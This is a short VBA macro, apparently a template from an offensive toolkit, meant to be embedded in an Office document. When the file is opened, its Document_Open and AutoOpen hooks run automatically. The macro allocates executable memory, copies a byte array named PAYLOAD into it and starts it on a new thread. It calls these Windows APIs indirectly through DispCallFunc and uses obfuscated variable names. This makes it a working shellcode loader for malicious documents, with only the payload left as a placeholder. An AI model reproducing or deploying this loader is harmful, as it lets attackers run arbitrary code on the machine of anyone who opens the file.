Declare PtrSafe Function DispCallFunc Lib "OleAut32.dll" (ByVal pvInstance As Long, ByVal offsetinVft As Long, ByVal CallConv As Long, ByVal retTYP As Integer, ByVal paCNT As Long, ByRef paTypes As Integer, ByRef paValues As Long, ByRef retVAR As Variant) As Long
Declare PtrSafe Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (ByVal lpLibFileName As String) As Long
Declare PtrSafe Function GetProcAddress Lib "kernel32" (ByVal hModule As Long, ByVal lpProcName As String) As Long

Const CC_STDCALL = 4
Const MEM_COMMIT = &H1000
Const PAGE_EXECUTE_READWRITE = &H40

Private VType(0 To 63) As Integer, VPtr(0 To 63) As Long

Function NTj()
    Dim EOu As Long
    Dim ETC As Long

    HoR = PAYLOAD

    EOu = stdCallA("kernel32", "VirtualAlloc", vbLong, 0&, UBound(HoR), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    
    For eqM = LBound(HoR) To UBound(HoR)
        NXY = HoR(eqM)
        ETC = stdCallA("kernel32", "RtlMoveMemory", vbLong, EOu + eqM, NXY, 1)
    Next eqM

    ETC = stdCallA("kernel32", "CreateThread", vbLong, 0&, 0&, EOu, 0&, 0&, 0&)
End Function

Public Function stdCallA(sDll As String, sFunc As String, ByVal RetType As VbVarType, ParamArray P() As Variant)
    Dim i As Long, pFunc As Long, V(), HRes As Long
    ReDim V(0)

    V = P

    For i = 0 To UBound(V)
        If VarType(P(i)) = vbString Then P(i) = StrConv(P(i), vbFromUnicode): V(i) = StrPtr(P(i))
        
        VType(i) = VarType(V(i))
        VPtr(i) = VarPtr(V(i))
    Next i

    HRes = DispCallFunc(0, GetProcAddress(LoadLibrary(sDll), sFunc), CC_STDCALL, RetType, i, VType(0), VPtr(0), stdCallA)
End Function

Sub Document_Open()
    NTj
End Sub

Sub AutoOpen()
    NTj
End Sub